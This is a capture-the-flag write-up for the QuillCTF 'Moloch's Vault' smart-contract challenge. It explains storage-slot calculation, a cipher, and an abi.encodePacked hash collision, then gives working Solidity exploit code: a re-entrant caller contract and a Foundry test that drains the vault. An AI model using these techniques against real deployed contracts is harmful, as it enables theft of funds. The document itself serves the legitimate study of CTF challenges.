# Proof of Concept for Moloch's Vault CTF Challenge

https://quillctf.super.site/challenges/quillctf-challenges/molochs-vault

## Objective

This document presents a proof of concept for the Moloch's Vault CTF Challenge. The objective of the challenge is to steal at least 1 WEI from the MolochVault contract.

## Contract Details

- Contract Address (Görli Testnet): 0xafb9ed5cd677a1bd5725ca5fcb9a3a0572d94f6f
- Contract Source: [Etherscan](https://goerli.etherscan.io/address/0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f#code)

## Questions

### Detailed formula for finding the slot of the dynamic struct

Source: <https://docs.soliditylang.org/en/v0.8.19/internals/layout_in_storage.html?highlight=dynamic%20struct#mappings-and-dynamic-arrays>

Due to their unpredictable size, mappings and dynamically-sized array types cannot be stored “in between” the state variables preceding and following them. Instead, they are considered to occupy only 32 bytes with regards to the rules above and the elements they contain are stored starting at a different storage slot that is computed using a Keccak-256 hash.

If the mapping value is a non-value type, the computed slot marks the start of the data. If the value is of struct type, for example, you have to add an offset corresponding to the struct member to reach the member.

In the challenge we have the following declaration:

```solidity
struct Cabal {
        address payable identity;
        string password;
    }
    Cabal[] private cabals;
```

The formula for finding the slot of the identity and password fields of the n element of the cabals array, where p is the storage slot of cabals, is:

```solidity
identity_slot = keccak256(keccak256(p) + n);
password_slot = keccak256(keccak256(p) + n) + 1;
```

### Details of decrypting Moloch-algorithm

The Moloch algorithm is a simple caesar cipher that used a different key for vowels and consonants. The key for vowels is 24 and the key for consonants is 2.

### Explain bypass for keccak256(abi.encodePacked())

Source: <https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#non-standard-packed-modes>

If you use `keccak256(abi.encodePacked(a, b))` and both a and b are dynamic types, it is easy to craft collisions in the hash value by moving parts of a into b and vice-versa. More specifically, `abi.encodePacked("a", "bc") == abi.encodePacked("ab", "c")`. If you use abi.encodePacked for signatures, authentication or data integrity, make sure to always use the same types and check that at most one of them is dynamic. Unless there is a compelling reason, abi.encode should be preferred.

## Proof of Concept

### MolochCaller.sol

```solidity
pragma solidity ^0.8.16;

import "./MOLOCH_VAULT.sol";

contract MolochCaller {
    MOLOCH_VAULT molochVault;

    constructor(address payable _molochVaultAddress) {
        molochVault = MOLOCH_VAULT(_molochVaultAddress);
    }

    function callUhER778(string[3] memory _openSecrete) public payable {
        // Make sure the MolochCaller has at least 2 wei balance to forward to MOLOCH_VAULT
        require(
            address(this).balance >= 2 wei,
            "MolochCaller balance must be at least 2 wei"
        );

        // Call the uhER778 function in the MOLOCH_VAULT contract
        (bool success, ) = address(molochVault).call{value: 2 wei}(
            abi.encodeWithSignature("uhER778(string[3])", _openSecrete)
        );

        // Check if the call was successful
        require(success, "uhER778 call failed");
    }

    function callSendGrant(address _guarantee) public payable {
        molochVault.sendGrant(payable(_guarantee));
    }

    // Function to deposit Ether into the MolochCaller
    function deposit() public payable {
        require(msg.value > 0, "Must deposit a positive amount of Ether");
    }

    // Fallback function to receive Ether
    fallback() external payable {
        // Forward the received 1 wei back to the MOLOCH_VAULT contract
        (bool sent, ) = address(molochVault).call{value: 2 wei}("");
        require(sent, "Failed to send 1 wei back to MOLOCH_VAULT");
    }
}
```

### MOLOCH_VAULT.t.sol

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import "../src/MOLOCH_VAULT.sol";
import "../src/MolochCaller.sol";

contract MolochVaultTest is Test {
    MOLOCH_VAULT molochVault;
    address payable vaultAddress =
        payable(0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f);

    // re-entrant exploiter caller
    MolochCaller molochCaller;

    // OSINT Information
    // Source: https://goerli.etherscan.io/address/0xaFB9ed5cD677a1bD5725Ca5FcB9a3a0572D94f6f#code

    // Constructor Arguments:
    // molochPass: The Moloch password
    string molochPass = "BLOODY PHARMACIST";

    // question: The two parts of the question
    string[2] question = ["WHO DO YOU", "SERVE?"];

    // initialCabalsAddresses: The initial addresses for the Cabals
    address payable[3] initialCabalsAddresses = [
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4),
        payable(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2),
        payable(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db)
    ];

    // initialCabalsPasswords: The initial passwords for the Cabals
    string[3] initialCabalsPasswords = [
        "KCLEQ",
        "BGTGJQNGP",
        "ZJQQBW*NFCPKCAKQR"
    ];

    // Deployment Transaction:
    // https://goerli.etherscan.io/tx/0x72049d23504379883f2dbd9265bb80ef0031beb2f3d12e18865ca4a2c7a63390

    // Vault Deployer Address
    address deployer = 0x6c3b4b9f3B27fA64dEB63962e49Fc582f5187E05;

    // Moloch Hash
    bytes32 Moloch;

    // hsah Hash
    bytes32 hsah;

    // hy7UIH Hash
    bytes32 hy7UIH;

    function setUp() public {
        vm.deal(msg.sender, 1 ether);
        molochVault = MOLOCH_VAULT(vaultAddress);
        // calculating constructor immutable variables
        Moloch = calculateMolochHash(address(deployer));
        hsah = keccak256(abi.encodePacked(molochPass));
        hy7UIH = keccak256(abi.encodePacked(question[0], question[1]));
        molochCaller = new MolochCaller(payable(address(molochVault)));
        molochCaller.deposit{value: 3 wei}();
    }

    function testHack() public {
        string[2] memory differentQuestion = ["WHO DO ", "YOUSERVE?"];
        string[3] memory _openSecrete = [
            molochPass,
            differentQuestion[0],
            differentQuestion[1]
        ];
        molochCaller.callUhER778(_openSecrete);
        molochCaller.callSendGrant(msg.sender);
    }

    function calculateMolochHash(address addr) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(addr));
    }
}
```
